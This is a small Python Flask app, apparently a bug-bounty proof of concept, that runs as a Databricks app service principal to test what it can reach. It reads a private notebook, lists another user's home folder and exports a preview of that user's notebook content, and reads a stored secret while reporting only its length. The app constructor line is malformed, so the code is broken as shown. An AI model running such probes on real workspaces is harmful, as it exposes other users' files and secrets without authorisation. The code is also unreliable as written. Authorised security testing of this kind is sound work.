
import os
from databricks.sdk import WorkspaceClient
from flask import Flask, jsonify
app = Flask(__name__()

@app.route("/")
def home():
    return "h3-app ok"

@app.route("/probe3")
def probe3():
    w = WorkspaceClient()
    out = {}
    # 1. OWN private notebook read as app SP (fixed handling)
    try:
        c = w.workspace.export("/Users/m4tr1x4g3nt47+user1@wearehackerone.com/h3_priv_nb", format="SOURCE")
        txt = c.content if isinstance(c.content, str) else __import__("base64").b64decode(c.content).decode("utf-8", "replace")
        out["own_priv_read"] = {"ok": True, "contains_marker": "H3-APPSP-READ" in txt, "len": len(txt)}
    except Exception as e:
        out["own_priv_read"] = {"ok": False, "err": str(e)[:200]}
    # 2. OTHER user (ram_rattle) home: list then read first object (report metadata only)
    try:
        objs = list(w.workspace.list("/Users/ram_rattle+user1@wearehackerone.com"))
        out["other_home"] = [o.path for o in objs][:10]
        target = None
        for o in objs:
            if str(getattr(o, "object_type", "")).startswith("NOTEBOOK") or str(getattr(o, "object_type", "")).startswith("FILE"):
                target = o.path
                break
        # descend one level if only dirs
        if not target and objs:
            sub = list(w.workspace.list(objs[0].path))
            out["other_sub"] = [o.path for o in sub][:10]
            for o in sub:
                ot = str(getattr(o, "object_type", ""))
                if ot.startswith("NOTEBOOK") or ot.startswith("FILE"):
                    target = o.path
                    break
        if target:
            c = w.workspace.export(target, format="SOURCE")
            txt = c.content if isinstance(c.content, str) else __import__("base64").b64decode(c.content).decode("utf-8", "replace")
            out["other_read"] = {"path": target, "read_ok": True, "len": len(txt),
                                 "content_preview_words": " ".join(txt.split())[:120]}
    except Exception as e:
        out["other_read_err"] = str(e)[:200]
    # 3. secret access as app SP (lengths/keys only, never values)
    try:
        keys = [k.key for k in w.secrets.list_secrets("h1_test")]
        out["h1_test_keys"] = keys[:10]
        if keys:
            s = w.secrets.get_secret("h1_test", keys[0])
            out["h1_test_read"] = {"ok": True, "value_len": len(s.value) if s.value else 0}
    except Exception as e:
        out["h1_test_secret_err"] = str(e)[:180]
    return jsonify(out)
